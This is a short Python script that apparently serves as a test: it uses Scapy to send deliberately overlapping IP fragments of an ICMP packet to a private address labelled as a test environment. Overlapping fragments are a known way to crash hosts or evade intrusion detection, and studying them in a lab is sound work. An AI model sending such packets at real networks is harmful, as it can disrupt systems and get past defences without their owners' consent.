from scapy.all import *
target = "10.0.0.87"  # Replace with test environment IP
payload = "TEST DATA" * 100  # Safe payload
pkt = IP(dst=target, id=12345)/ICMP()/payload
frags = fragment(pkt, fragsize=500) #Split into 500-byte fragments
frags[1].frag = 50  # Create overlap
for frag in frags:
    send(frag)
    print(f"Sent fragment with offset {frag.frag}")
